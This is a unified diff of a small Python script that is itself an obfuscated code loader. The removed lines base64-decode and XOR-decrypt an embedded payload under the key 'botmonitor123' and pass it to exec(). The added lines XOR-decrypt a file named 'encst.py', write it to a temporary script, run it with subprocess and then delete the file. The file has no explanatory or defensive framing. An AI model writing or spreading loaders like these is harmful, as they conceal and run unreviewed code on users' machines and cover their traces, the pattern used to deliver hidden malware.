@@ -1,13 +1,24 @@
-import base64
+def xor_decrypt_and_execute(encrypted_file, key):
+    with open(encrypted_file, 'rb') as f:
+        encrypted_data = f.read()
 
-key = "botmonitor123"
+    decrypted_data = bytearray([byte ^ key for byte in encrypted_data])
 
-payload = "GwoCDVNRBx0dChAKH1leAwcMAQZZFAVUAAxYBRRWR0NaBxETCgdIUV0RFVZTCh5aAw4HAhlZBQxVRgAXRgpXRAobWxwaBxdGChdSRQwZAhEXDkAHRQMMRQ9ZGRA+QhcBFVtDAlZXT0MAQAsSAlZGTQcRABALDk1aBQZNRFQAV0xcTx1WWR4ABlcOVQJGRFAdV1wcBRZUXU0eCl4TH1xUTVJVR0xaAAwRAAZWG1QLAxZGVx8AHgZTExdRQgMVUVoZRR1ZWh8VRhYFAhEWRVQfXhZcHQc="
 
-def xor_decrypt(data, key):
-    return ''.join(chr(c ^ ord(key[i % len(key)])) for i, c in enumerate(data))
+    temp_file = "__temp__.py"
+    with open(temp_file, 'wb') as f:
+        f.write(decrypted_data)
 
-import zlib
-code = base64.b64decode(payload)
-plain = xor_decrypt(code, key)
-exec(plain)
+
+    import subprocess
+    subprocess.run(["python", temp_file])
+
+
+    import os
+    os.remove(temp_file)
+
+if __name__ == "__main__":
+    encrypted_file = "encst.py"
+    key = 123
+
+    xor_decrypt_and_execute(encrypted_file, key)
